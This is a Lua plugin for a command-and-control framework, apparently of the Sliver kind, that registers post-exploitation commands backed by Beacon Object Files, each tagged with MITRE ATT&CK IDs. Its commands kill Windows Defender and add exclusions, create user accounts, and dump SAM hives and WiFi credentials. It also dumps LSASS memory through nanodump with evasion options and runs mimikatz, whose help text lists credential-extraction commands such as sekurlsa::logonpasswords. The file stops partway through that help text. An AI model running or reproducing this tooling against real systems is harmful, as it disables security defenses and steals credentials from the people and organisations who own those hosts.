-- Community BOF Tools Plugin
-- This plugin provides various BOF (Beacon Object File) tools for penetration testing
local time = require("time")

function bof_pack(format, ...)
    local args = {...}
    return pack_bof_args(format, args)
end

function read(filename)
    local file = io.open(filename, "r")
    if not file then
        print("file not found")
        return nil
    end
    local content = file:read("*all")
    file:close()
    return content
end

function new_sac()
    local sac = new_sacrifice(0, false, false, false, "")
    return sac
end

local function bof_path(bof_name, arch)
    return "bof/" .. bof_name .. "/" .. bof_name .. "." .. arch .. ".o"
end

-- screenshot
local function run_screenshot(cmd)
    local filename = cmd:Flags():GetString("filename")
    local packed_args = bof_pack("z", filename)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("screenshot", arch)
    local result = bof(session, script_resource(bof_file), packed_args, true)
    return result
end

local cmd_screenshot = command("screenshot", run_screenshot, "Command: situational screenshot <filename>", "T1113")
cmd_screenshot:Flags():String("filename","screenshot.jpg","filename to save screenshot")

-- add_net_user
local function run_add_net_user(cmd)
    local username = cmd:Flags():GetString("username")
    local password = cmd:Flags():GetString("password")
    if username == "" then
        error("username is required")
    end
    if password == "" then
        error("password is required")
    end
    local packed_args = bof_pack("ZZ", username, password)
    local session = active()
    local arch = session.Os.Arch
    if not isadmin(session) then
        error("You need to be an admin to run this command")
    end
    local bof_file = bof_path("add_net_user", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_add_net_user = command("add_net_user", run_add_net_user, "Add a new user account <username> <password>", "T1136.001")
cmd_add_net_user:Flags():String("username", "", "the username to add")
cmd_add_net_user:Flags():String("password", "", "the password to set")

-- curl
local function run_curl(args,cmd)
    local host = cmd:Flags():GetString("host")
    local port = cmd:Flags():GetString("port")
    local method = cmd:Flags():GetString("method")
    local disable_output = cmd:Flags():GetBool("disable-output")
    local noproxy = cmd:Flags():GetBool("noproxy")
    local useragent = cmd:Flags():GetString("useragent")
    local header = cmd:Flags():GetString("header")
    local body = cmd:Flags():GetString("body")

    if host == "" then
        error("host is required")
    end
    if port == "" then
        port = "80"
    end
    if method == "" then
        method = "GET"
    end
    if header == "" then
        header = "Accept: */*"
    end
    if useragent == "" then
        useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
    end

    local valid_methods = {
        GET = true,
        POST = true,
        PUT = true,
        PATCH = true,
        DELETE = true
    }
    if not valid_methods[method] then
        error("HTTP method " .. method .. " isn't valid.")
    end

    local output = disable_output and 0 or 1
    local proxy = noproxy and 0 or 1

    local packed_args = bof_pack("zizizzzi", host, tonumber(port), method, output, useragent, header, body, proxy)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("curl", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

--local cmd_curl = command("curl", run_curl, "HTTP client tool <host> [options]", "T1071.001")
--cmd_curl:Flags():String("host", "", "target host")
--cmd_curl:Flags():String("port", "80", "target port")
--cmd_curl:Flags():String("method", "GET", "HTTP method (GET, POST, PUT, PATCH, DELETE)")
--cmd_curl:Flags():Bool("disable-output", false, "disable output display")
--cmd_curl:Flags():Bool("noproxy", false, "disable proxy usage")
--cmd_curl:Flags():String("useragent", "", "custom user agent")
--cmd_curl:Flags():String("header", "", "custom header")
--cmd_curl:Flags():String("body", "", "request body")

-- readfile
local function run_readfile(args,cmd)
    local filepath = args[1]
    if filepath == "" or filepath == nil then
        filepath = cmd:Flags():GetString("filepath")
    end
    if filepath == "" then
        error("filepath is required")
    end
    local packed_args = bof_pack("z", filepath)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("readfile", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_readfile = command("readfile", run_readfile, "Read file content <filepath>", "T1005")
cmd_readfile:Flags():String("filepath", "", "path to the file to read")

-- kill_defender
local function run_kill_defender(args,cmd)
    local action = args[1]
    if action == "" then
        action = cmd:Flags():GetString("action")
    end
    if action == "" then
        error("action is required (kill or check)")
    end
    if action ~= "kill" and action ~= "check" then
        error("action must be 'kill' or 'check'")
    end
    local packed_args = bof_pack("z", action)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("kill_defender", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_kill_defender = command("kill_defender", run_kill_defender, "Kill or check Windows Defender <action>", "T1562.001")
cmd_kill_defender:Flags():String("action", "", "action to perform (kill or check)")

-- clipboard
local function run_clipboard(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("clipboard", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_clipboard = command("clipboard", run_clipboard, "Get clipboard content", "T1115")

-- dump_clipboard
local function run_dump_clipboard(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("dump_clipboard", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_dump_clipboard = command("dump_clipboard", run_dump_clipboard, "Dump clipboard content", "T1115")

-- dump_wifi
local function run_dump_wifi(args, cmd)
    local profilename = ""

    -- Check if using positional arguments first
    if args and #args == 1 and args[1] ~= "" then
        -- Positional argument format: dump_wifi profilename
        profilename = args[1]
    else
        -- Flag format: dump_wifi --profilename profilename
        profilename = cmd:Flags():GetString("profilename")
    end

    if profilename == "" then
        error("profilename is required")
    end

    local packed_args = bof_pack("Z", profilename)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("dump_wifi", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_dump_wifi = command("dump_wifi", run_dump_wifi, "Dump WiFi profile credentials <profilename>", "T1555.004")
cmd_dump_wifi:Flags():String("profilename", "", "WiFi profile name to dump")

help("dump_wifi", [[
Positional arguments format:
  dump_wifi "My WiFi Network"
  dump_wifi MyWiFi

Flag format:
  dump_wifi --profilename "My WiFi Network"
  dump_wifi --profilename MyWiFi
]])

-- enum_wifi
local function run_enum_wifi(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_wifi", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_enum_wifi = command("enum_wifi", run_enum_wifi, "Enumerate WiFi profiles", "T1016")

-- memoryinfo
local function run_memoryinfo(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("memoryinfo", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_memoryinfo = command("memoryinfo", run_memoryinfo, "Get system memory information", "T1082")

-- memreader
local function run_memreader(cmd)
    local target_pid = cmd:Flags():GetString("target-pid")
    local pattern = cmd:Flags():GetString("pattern")
    local output_size = cmd:Flags():GetString("output-size")

    if target_pid == "" then
        error("target-pid is required")
    end
    if pattern == "" then
        error("pattern is required")
    end
    if output_size == "" then
        output_size = "10"
    end

    local packed_args = bof_pack("izi", tonumber(target_pid), pattern, tonumber(output_size))
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("memreader", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_memreader = command("memreader", run_memreader, "Read memory from target process <target-pid> <pattern> [output-size]", "T1055")
cmd_memreader:Flags():String("target-pid", "", "target process ID")
cmd_memreader:Flags():String("pattern", "", "memory pattern to search")
cmd_memreader:Flags():String("output-size", "10", "output size limit")

-- dump_sam
local function run_dump_sam(args, cmd)
    local location = ""

    -- Check if using positional arguments first
    if args and #args == 1 and args[1] ~= "" then
        -- Positional argument format: dump_sam [location]
        location = args[1]
    else
        -- Flag format: dump_sam --location location
        location = cmd:Flags():GetString("location")
    end

    -- Use default location if not specified
    if location == "" then
        location = "C:\\Windows\\Temp\\"
    end

    local session = active()
    if not isadmin(session) then
        error("You need to be an admin to run this command")
    end

    local packed_args = bof_pack("z", location)
    local arch = session.Os.Arch
    local bof_file = bof_path("dump_sam", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_dump_sam = command("dump_sam", run_dump_sam, "Dump the SAM, SECURITY and SYSTEM registries [location]", "T1012")
cmd_dump_sam:Flags():String("location", "C:\\Windows\\Temp\\", "folder to save (optional)")

help("dump_sam", [[
Positional arguments format:
  dump_sam                           # Use default location (C:\Windows\Temp\)
  dump_sam C:\temp\                  # Specify custom location
  dump_sam "C:\My Folder\"           # Location with spaces

Flag format:
  dump_sam --location C:\temp\
  dump_sam --location "C:\My Folder\"

Note: Requires administrator privileges
]])

-- pingscan
local function run_pingscan(cmd)
    local target = cmd:Flags():GetString("target")
    if target == "" then
        error("target is required")
    end

    local packed_args = bof_pack("z", target)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("pingscan", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_pingscan = command("pingscan", run_pingscan, "Ping scan target <target>", "T1018")
cmd_pingscan:Flags():String("target", "", "IP or hostname(eg. 10.10.121.100-10.10.121.120,192.168.0.1/24)")

-- portscan
local function run_portscan(cmd)
    local target = cmd:Flags():GetString("target")
    local ports = cmd:Flags():GetString("ports")
    if target == "" then
        error("target is required")
    end
    if ports == "" then
        error("ports is required")
    end

    local packed_args = bof_pack("zz", target, ports)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("portscan", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_portscan = command("portscan", run_portscan, "Port scan target <target> <ports> [timeout]", "T1046")
cmd_portscan:Flags():String("target", "", "IPv4 ranges and CIDR (eg. 192.168.1.128, 192.168.1.128-192.168.2.240, 192.168.1.0/24)")
cmd_portscan:Flags():String("ports", "", "ports to scan (e.g., 80,443,8080 or 1-1000)")

-- add_exclusion
local function run_add_exclusion(cmd)
    local excltype = cmd:Flags():GetString("type")
    local excldata = cmd:Flags():GetString("data")
    if excltype == "" then
        error("exclusion type is required")
    end
    if excldata == "" then
        error("exclusion data is required")
    end
    if excltype ~= "path" and excltype ~= "process" and excltype ~= "extension" then
        error("exclusion type must be 'path', 'process', or 'extension'")
    end
    local packed_args = bof_pack("zZ", excltype, excldata)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("add_exclusion", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_add_exclusion = command("add_exclusion", run_add_exclusion, "Add Windows Defender exclusion <type> <data>", "T1562.001")
cmd_add_exclusion:Flags():String("type", "", "exclusion type (path, process, extension)")
cmd_add_exclusion:Flags():String("data", "", "exclusion data")

-- del_exclusion
local function run_del_exclusion(cmd)
    local excltype = cmd:Flags():GetString("type")
    local excldata = cmd:Flags():GetString("data")
    if excltype == "" then
        error("exclusion type is required")
    end
    if excldata == "" then
        error("exclusion data is required")
    end
    local packed_args = bof_pack("zZ", excltype, excldata)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("del_exclusion", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_del_exclusion = command("del_exclusion", run_del_exclusion, "Delete Windows Defender exclusion <type> <data>", "T1562.001")
cmd_del_exclusion:Flags():String("type", "", "exclusion type (path, process, extension)")
cmd_del_exclusion:Flags():String("data", "", "exclusion data")

-- dir
local function run_dir(cmd)
    local path = cmd:Flags():GetString("path")
    if path == "" then
        path = "."
    end
    local packed_args = bof_pack("z", path)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("dir", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_dir = command("dir", run_dir, "List directory contents [path]", "T1083")
cmd_dir:Flags():String("path", ".", "directory path to list")

-- enum_dotnet
local function run_dotnet_enum(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_dotnet", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_dotnet_enum = command("enum_dotnet", run_dotnet_enum, "Enumerate .NET assemblies", "T1033")

-- enum_drives
local function run_enum_drives(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_drives", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_enum_drives = command("enum_drives", run_enum_drives, "Enumerate system drives", "T1135")

-- enum_exclusions
local function run_enum_exclusions(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_exclusions", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_enum_exclusions = command("enum_exclusions", run_enum_exclusions, "Enumerate Windows Defender exclusions", "T1518.001")

-- enum_files
local function run_enum_files(cmd)
    local directory = cmd:Flags():GetString("directory")
    local pattern = cmd:Flags():GetString("pattern")
    local keyword = cmd:Flags():GetString("keyword")
    if directory == "" then
        error("directory is required")
    end
    if pattern == "" then
        error("search pattern is required")
    end
    local packed_args = bof_pack("zzz", directory, pattern, keyword)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_files", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_enum_files = command("enum_files", run_enum_files, "Enumerate files <directory> <pattern> [keyword]", "T1083")
cmd_enum_files:Flags():String("directory", "", "directory path to search")
cmd_enum_files:Flags():String("pattern", "", "search pattern (e.g., *.txt)")
cmd_enum_files:Flags():String("keyword", "", "optional keyword filter")

-- enum_localcert
local function run_enum_localcert(cmd)
    local store = cmd:Flags():GetString("store")
    if store == "" then
        error("certificate store name is required")
    end
    local packed_args = bof_pack("Z", store)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_localcert", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_enum_localcert = command("enum_localcert", run_enum_localcert, "Enumerate local certificates <store>", "T1553.003")
cmd_enum_localcert:Flags():String("store", "", "certificate store name")

-- enum_localsessions
local function run_enum_localsessions(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_localsessions", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_enum_localsessions = command("enum_localsessions", run_enum_localsessions, "Enumerate local user sessions", "T1033")

-- ipconfig
local function run_ipconfig(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("ipconfig", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_ipconfig = command("ipconfig", run_ipconfig, "Display network configuration", "T1016")

-- list_dns
local function run_list_dns(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("list_dns", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_list_dns = command("list_dns", run_list_dns, "List DNS configuration", "T1016")

-- enum_net_user
local function run_enum_net_user(cmd)
    local enumtype = cmd:Flags():GetString("type")
    local type_map = {all = 1, locked = 2, disabled = 3, active = 4}
    local _type = type_map[enumtype:lower()]
    if _type == nil then
        error("Parameter must be one of: [all, locked, disabled, active]")
    end

    local packed_args = bof_pack("ii", 0, _type)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("enum_net_user", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_enum_net_user = command("enum_net_user", run_enum_net_user, "Enumerate network users [type]", "T1087.002")
cmd_enum_net_user:Flags():String("type", "all", "enumeration type (all, locked, disabled, active)")

-- query_net_user
local function run_query_net_user(cmd)
    local username = cmd:Flags():GetString("username")
    local domain = cmd:Flags():GetString("domain")
    if username == "" then
        error("username is required")
    end
    local packed_args = bof_pack("ZZ", username, domain)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("query_net_user", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_query_net_user = command("query_net_user", run_query_net_user, "Query user information <username> [domain]", "T1087.002")
cmd_query_net_user:Flags():String("username", "", "username to query")
cmd_query_net_user:Flags():String("domain", "", "domain name (optional)")

-- nslookup
local function run_nslookup(args, cmd)
    local host = ""
    local server = ""
    local record_type = ""

    -- Check if using positional arguments first
    if args and #args >= 1 and args[1] ~= "" then
        -- Positional argument format: nslookup hostname [server] [type]
        host = args[1]
        if #args >= 2 and args[2] ~= "" then
            server = args[2]
        end
        if #args >= 3 and args[3] ~= "" then
            record_type = args[3]
        end
    else
        -- Flag format: nslookup --host hostname --server server --record-type type
        host = cmd:Flags():GetString("host")
        server = cmd:Flags():GetString("server")
        record_type = cmd:Flags():GetString("record-type")
    end

    if host == "" then
        error("hostname is required")
    end

    if server == "127.0.0.1" then
        error("Localhost DNS queries have a potential to crash, refusing")
    end

    -- DNS record type mapping
    local recordmapping = {
        A = 1,
        NS = 2,
        MD = 3,
        MF = 4,
        CNAME = 5,
        SOA = 6,
        MB = 7,
        MG = 8,
        MR = 9,
        WKS = 0xb,
        PTR = 0xc,
        HINFO = 0xd,
        MINFO = 0xe,
        MX = 0xf,
        TEXT = 0x10,
        RP = 0x11,
        AFSDB = 0x12,
        X25 = 0x13,
        ISDN = 0x14,
        RT = 0x15,
        AAAA = 0x1c,
        SRV = 0x21,
        WINSR = 0xff02,
        KEY = 0x19,
        ANY = 0xff
    }

    local record_type_num = recordmapping["A"]  -- Default to A record
    if record_type ~= "" then
        local requested_type = record_type:upper()
        if recordmapping[requested_type] then
            record_type_num = recordmapping[requested_type]
        else
            error("Invalid record type: " .. requested_type)
        end
    end

    local packed_args = bof_pack("zzs", host, server, record_type_num)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("nslookup", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_nslookup = command("nslookup", run_nslookup, "DNS lookup <hostname> [server] [record-type]", "T1016")
cmd_nslookup:Flags():String("host", "", "hostname or IP to lookup")
cmd_nslookup:Flags():String("server", "", "DNS server to use (optional)")
cmd_nslookup:Flags():String("record-type", "A", "DNS record type (A, NS, CNAME, MX, AAAA, etc.)")

help("nslookup", [[
Positional arguments format:
  nslookup www.baidu.com
  nslookup www.baidu.com 8.8.8.8
  nslookup www.baidu.com 8.8.8.8 CNAME

Flag format:
  nslookup --host www.baidu.com
  nslookup --host www.baidu.com --server 114.114.114.114
  nslookup --host www.baidu.com --server 114.114.114.114 --record-type MX
]])

-- route_print
local function run_route_print(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("route_print", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_route_print = command("route_print", run_route_print, "Display routing table", "T1016")

-- systeminfo
local function run_systeminfo(cmd)
    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("systeminfo", arch)
    return bof(session, script_resource(bof_file), {}, true)
end

local cmd_systeminfo = command("systeminfo", run_systeminfo, "Display system information", "T1082")

-- klist
local function run_klist(cmd)
    local action = cmd:Flags():GetString("action")
    local spn = cmd:Flags():GetString("spn")

    local packed_args
    if action == "" then
        -- Default action: list tickets
        packed_args = {}
    elseif action == "purge" then
        packed_args = bof_pack("Z", "purge")
    elseif action == "get" then
        if spn == "" then
            error("SPN is required for 'get' action")
        end
        packed_args = bof_pack("ZZ", "get", spn)
    else
        error("Invalid action. Use 'get' or 'purge', or leave empty to list tickets")
    end

    local session = active()
    local arch = session.Os.Arch
    local bof_file = bof_path("klist", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_klist = command("klist", run_klist, "Interact with cached Kerberos tickets [action] [spn]", "T1558")
cmd_klist:Flags():String("action", "", "action to perform (get, purge, or empty to list)")
cmd_klist:Flags():String("spn", "", "target SPN (required for 'get' action)")

-- nanodump
local function run_nanodump(cmd)
    local session = active()
    local arch = session.Os.Arch

    if arch ~= "x64" then
        error("Nanodump only supports x64")
    end

    -- Get all parameters
    local get_pid = cmd:Flags():GetBool("getpid")
    local use_valid_sig = cmd:Flags():GetBool("valid")
    local write_file_flag = cmd:Flags():GetBool("write")
    local dump_path = cmd:Flags():GetString("write-path")
    local pid = cmd:Flags():GetString("pid")
    local fork = cmd:Flags():GetBool("fork")
    local snapshot = cmd:Flags():GetBool("snapshot")
    local dup = cmd:Flags():GetBool("duplicate")
    local elevate_handle = cmd:Flags():GetBool("elevate-handle")
    local duplicate_elevate = cmd:Flags():GetBool("duplicate-elevate")
    local use_seclogon_leak_local = cmd:Flags():GetBool("seclogon-leak-local")
    local use_seclogon_leak_remote = cmd:Flags():GetBool("seclogon-leak-remote")
    local seclogon_leak_remote_binary = cmd:Flags():GetString("seclogon-leak-remote-path")
    local use_silent_process_exit = cmd:Flags():GetBool("silent-process-exit")
    local silent_process_exit = cmd:Flags():GetString("silent-process-exit-path")
    local use_lsass_shtinkering = cmd:Flags():GetBool("shtinkering")
    local use_seclogon_duplicate = cmd:Flags():GetBool("seclogon-duplicate")
    local spoof_callstack = cmd:Flags():GetBool("spoof-callstack")
    local chunk_size_kb = cmd:Flags():GetString("chunk-size")

    -- Set default values
    local write_file = write_file_flag and 1 or 0
    local pid_num = (pid ~= "" and tonumber(pid)) or 0
    local chunk_size = 0xe1000

    if chunk_size_kb ~= "" then
        local size = tonumber(chunk_size_kb)
        if size == nil or size <= 0 then
            error("Invalid chunk size: " .. chunk_size_kb)
        end
        chunk_size = size * 1024
    end

    if dump_path == "" then
        local time = timestamp()
        dump_path = string.format("%s_lsass_%s.dmp", session.Os.Username, time)
    end

    -- Convert booleans to integers
    local get_pid_int = get_pid and 1 or 0
    local use_valid_sig_int = use_valid_sig and 1 or 0
    local fork_int = fork and 1 or 0
    local snapshot_int = snapshot and 1 or 0
    local dup_int = dup and 1 or 0
    local elevate_handle_int = elevate_handle and 1 or 0
    local duplicate_elevate_int = duplicate_elevate and 1 or 0
    local use_seclogon_leak_local_int = use_seclogon_leak_local and 1 or 0
    local use_seclogon_leak_remote_int = use_seclogon_leak_remote and 1 or 0
    local use_silent_process_exit_int = use_silent_process_exit and 1 or 0
    local use_lsass_shtinkering_int = use_lsass_shtinkering and 1 or 0
    local use_seclogon_duplicate_int = use_seclogon_duplicate and 1 or 0
    local spoof_callstack_int = spoof_callstack and 1 or 0

    -- Parameter validation
    if get_pid_int == 1 and (write_file + use_valid_sig_int + snapshot_int + fork_int + elevate_handle_int +
        duplicate_elevate_int + use_seclogon_duplicate_int + spoof_callstack_int + use_seclogon_leak_local_int +
        use_seclogon_leak_remote_int + dup_int + use_silent_process_exit_int + use_lsass_shtinkering_int) ~= 0 then
        error("The parameter --getpid is used alone")
    end

    if use_silent_process_exit_int == 1 and (write_file + use_valid_sig_int + snapshot_int + fork_int +
        elevate_handle_int + duplicate_elevate_int + use_seclogon_duplicate_int + spoof_callstack_int +
        use_seclogon_leak_local_int + use_seclogon_leak_remote_int + dup_int + use_lsass_shtinkering_int) ~= 0 then
        error("The parameter --silent-process-exit is used alone")
    end

    if fork_int == 1 and snapshot_int == 1 then
        error("The options --fork and --snapshot cannot be used together")
    end

    if dup_int == 1 and elevate_handle_int == 1 then
        error("The options --duplicate and --elevate-handle cannot be used together")
    end

    if duplicate_elevate_int == 1 and spoof_callstack_int == 1 then
        error("The options --duplicate-elevate and --spoof-callstack cannot be used together")
    end

    if dup_int == 1 and spoof_callstack_int == 1 then
        error("The options --duplicate and --spoof-callstack cannot be used together")
    end

    if dup_int == 1 and use_seclogon_duplicate_int == 1 then
        error("The options --duplicate and --seclogon-duplicate cannot be used together")
    end

    if elevate_handle_int == 1 and duplicate_elevate_int == 1 then
        error("The options --elevate-handle and --duplicate-elevate cannot be used together")
    end

    if duplicate_elevate_int == 1 and dup_int == 1 then
        error("The options --duplicate-elevate and --duplicate cannot be used together")
    end

    if duplicate_elevate_int == 1 and use_seclogon_duplicate_int == 1 then
        error("The options --duplicate-elevate and --seclogon-duplicate cannot be used together")
    end

    if elevate_handle_int == 1 and use_seclogon_duplicate_int == 1 then
        error("The options --elevate-handle and --seclogon-duplicate cannot be used together")
    end

    if dup_int == 1 and use_seclogon_leak_local_int == 1 then
        error("The options --duplicate and --seclogon-leak-local cannot be used together")
    end

    if dup_int == 1 and use_seclogon_leak_remote_int == 1 then
        error("The options --duplicate and --seclogon-leak-remote cannot be used together")
    end

    if duplicate_elevate_int == 1 and use_seclogon_leak_local_int == 1 then
        error("The options --duplicate-elevate and --seclogon-leak-local cannot be used together")
    end

    if duplicate_elevate_int == 1 and use_seclogon_leak_remote_int == 1 then
        error("The options --duplicate-elevate and --seclogon-leak-remote cannot be used together")
    end

    if elevate_handle_int == 1 and use_seclogon_leak_local_int == 1 then
        error("The options --elevate-handle and --seclogon-leak-local cannot be used together")
    end

    if elevate_handle_int == 1 and use_seclogon_leak_remote_int == 1 then
        error("The options --elevate-handle and --seclogon-leak-remote cannot be used together")
    end

    if use_seclogon_leak_local_int == 1 and use_seclogon_leak_remote_int == 1 then
        error("The options --seclogon-leak-local and --seclogon-leak-remote cannot be used together")
    end

    if use_seclogon_leak_local_int == 1 and use_seclogon_duplicate_int == 1 then
        error("The options --seclogon-leak-local and --seclogon-duplicate cannot be used together")
    end

    if use_seclogon_leak_local_int == 1 and spoof_callstack_int == 1 then
        error("The options --seclogon-leak-local and --spoof-callstack cannot be used together")
    end

    if use_seclogon_leak_remote_int == 1 and use_seclogon_duplicate_int == 1 then
        error("The options --seclogon-leak-remote and --seclogon-duplicate cannot be used together")
    end

    if use_seclogon_leak_remote_int == 1 and spoof_callstack_int == 1 then
        error("The options --seclogon-leak-remote and --spoof-callstack cannot be used together")
    end

    if use_seclogon_duplicate_int == 1 and spoof_callstack_int == 1 then
        error("The options --seclogon-duplicate and --spoof-callstack cannot be used together")
    end

    if use_lsass_shtinkering_int == 0 and use_seclogon_leak_local_int == 1 and write_file == 0 then
        error("If --seclogon-leak-local is being used, you need to provide the dump path with --write")
    end

    if use_lsass_shtinkering_int == 1 and fork_int == 1 then
        error("The options --shtinkering and --fork cannot be used together")
    end

    if use_lsass_shtinkering_int == 1 and snapshot_int == 1 then
        error("The options --shtinkering and --snapshot cannot be used together")
    end

    if use_lsass_shtinkering_int == 1 and use_valid_sig_int == 1 then
        error("The options --shtinkering and --valid cannot be used together")
    end

    if use_lsass_shtinkering_int == 1 and write_file == 1 then
        error("The options --shtinkering and --write cannot be used together")
    end

    if use_lsass_shtinkering and not isadmin(session) then
        error("You need to be admin to run the Shtinkering technique")
    end

    -- Handle seclogon leak local binary upload
    if use_seclogon_leak_local_int == 1 then
        local folder = "C:\\Windows\\Temp"
        seclogon_leak_remote_binary = folder .. "\\" .. random_string(6) .. ".exe"
        print("[!] An unsigned nanodump binary will be uploaded to: " .. seclogon_leak_remote_binary)
        local nanodump_exe = script_resource("bof/nanodump/nanodump." .. arch .. ".exe")
        local exe_content = read(nanodump_exe)
        uploadraw(session, exe_content, seclogon_leak_remote_binary, "0644", false)
    end

    -- Pack arguments
    local packed_args = bof_pack("iziiiiiiiiiiiziiizi",
        pid_num, dump_path, write_file, chunk_size, use_valid_sig_int, fork_int, snapshot_int,
        dup_int, elevate_handle_int, duplicate_elevate_int, get_pid_int, use_seclogon_leak_local_int,
        use_seclogon_leak_remote_int, seclogon_leak_remote_binary, use_seclogon_duplicate_int,
        spoof_callstack_int, use_silent_process_exit_int, silent_process_exit, use_lsass_shtinkering_int)

    local bof_file = bof_path("nanodump", arch)
    return bof(session, script_resource(bof_file), packed_args, true)
end

local cmd_nanodump = command("nanodump", run_nanodump, "Advanced LSASS memory dumping tool", "T1003.001")
cmd_nanodump:Flags():Bool("getpid", false, "get the PID of LSASS and exit")
cmd_nanodump:Flags():Bool("valid", false, "create a minidump with a valid signature")
cmd_nanodump:Flags():Bool("write", false, "write minidump to disk")
cmd_nanodump:Flags():String("write-path", "", "path to write the minidump")
cmd_nanodump:Flags():String("pid", "", "target process PID (default: auto-detect LSASS)")
cmd_nanodump:Flags():Bool("fork", false, "fork the target process")
cmd_nanodump:Flags():Bool("snapshot", false, "snapshot the target process")
cmd_nanodump:Flags():Bool("duplicate", false, "duplicate an existing LSASS handle")
cmd_nanodump:Flags():Bool("elevate-handle", false, "elevate handle privileges")
cmd_nanodump:Flags():Bool("duplicate-elevate", false, "duplicate and elevate handle")
cmd_nanodump:Flags():Bool("seclogon-leak-local", false, "use SecLogon leak (local)")
cmd_nanodump:Flags():Bool("seclogon-leak-remote", false, "use SecLogon leak (remote)")
cmd_nanodump:Flags():String("seclogon-leak-remote-path", "", "path for remote SecLogon leak binary")
cmd_nanodump:Flags():Bool("silent-process-exit", false, "use silent process exit")
cmd_nanodump:Flags():String("silent-process-exit-path", "", "path for silent process exit")
cmd_nanodump:Flags():Bool("shtinkering", false, "use LSASS shtinkering technique")
cmd_nanodump:Flags():Bool("seclogon-duplicate", false, "use SecLogon duplicate")
cmd_nanodump:Flags():Bool("spoof-callstack", false, "spoof the call stack")
cmd_nanodump:Flags():String("chunk-size", "", "chunk size in KB (default: 924)")

help("nanodump", [[
Basic LSASS dump:
  nanodump

Write minidump to disk with valid signature:
  nanodump --valid --write --write-path C:\Windows\Temp\lsass.dmp

Use fork and spoof callstack:
  nanodump --fork --spoof-callstack

Use shtinkering technique (requires admin):
  nanodump --shtinkering

Get LSASS PID only:
  nanodump --getpid
]])

-- mimikatz
local function run_mimikatz(args, cmd)
    local session = active()
    local arch = session.Os.Arch

    -- Ensure args is a table and add "exit" if not already present
    if args == nil then
        args = {}
    end

    -- Check if the last argument is already "exit"
    local needs_exit = true
    if #args > 0 and args[#args]:lower() == "exit" then
        needs_exit = false
    end

    -- Add "exit" command to prevent hanging
    if needs_exit then
        table.insert(args, "exit")
    end

    local mimikatz_path = "common/mimikatz/mimikatz." .. arch .. ".exe"
    return execute_exe(session, script_resource(mimikatz_path), args, true, 600, arch, "", new_sac())
end

local cmd_mimikatz = command("mimikatz", run_mimikatz, "Execute mimikatz with specified commands", "T1003")

help("mimikatz", [[
Positional arguments format:
  mimikatz coffee
  mimikatz privilege::debug sekurlsa::logonpasswords
  mimikatz "privilege::debug" "sekurlsa::logonpasswords"
  mimikatz privilege::debug sekurlsa::wdigest
  mimikatz privilege::debug sekurlsa::kerberos
  mimikatz privilege::debug lsadump::sam
  mimikatz privilege::debug lsadump::secrets
  mimikatz kerberos::list
  mimikatz crypto::capi
  mimikatz vault::list

Common credential extraction:
